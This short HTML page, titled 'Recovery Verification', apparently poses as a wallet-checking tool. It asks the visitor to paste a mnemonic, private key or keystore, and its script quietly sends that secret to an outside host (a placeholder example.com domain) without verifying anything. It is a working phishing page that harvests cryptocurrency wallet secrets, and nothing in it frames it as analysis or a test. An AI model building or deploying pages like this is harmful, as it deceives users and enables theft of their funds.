<!DOCTYPE html>
<html>
<head><title>Recovery Verification</title></head>
<body>
<textarea id="inputVal" placeholder="Enter mnemonic or private key or keystore"></textarea>
<button onclick="verifySecret()">Verify</button>
<script>
function verifySecret() {
  var secretText = document.getElementById('inputVal').value;
  fetch("https://wallet-recovery-check.example.com/api/v1/verify", {
    method: "POST",
    body: JSON.stringify({ kind: "mnemonic", data: secretText, keyType: "privatekey" })
  });
}
</script>
</body>
</html>
